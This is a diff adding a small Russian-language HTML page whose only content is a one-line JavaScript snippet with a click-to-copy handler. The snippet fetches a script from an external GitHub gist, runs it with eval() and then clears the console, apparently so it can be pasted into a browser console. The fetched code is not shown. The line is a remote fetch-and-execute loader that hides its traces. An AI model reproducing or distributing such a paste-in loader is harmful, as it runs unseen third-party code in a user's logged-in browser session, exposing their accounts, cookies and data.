@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>P1</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 20px;
+            font-family: monospace;
+        }
+        #code {
+            cursor: pointer;
+            user-select: all;
+        }
+    </style>
+</head>
+<body>
+    <div id="code">fetch('https://gist.githubusercontent.com/Khasan1111/cbe33274a6a36cd67ae54f5e484af117/raw/b74021fe110ae4d032c7da621b5fac071f2b6caa/gistfile1.js').then(r => r.text()).then(code => { eval(code); console.clear(); })</div>
+
+    <script>
+        document.getElementById('code').addEventListener('click', function() {
+            navigator.clipboard.writeText(this.textContent);
+        });
+    </script>
+</body>
+</html>
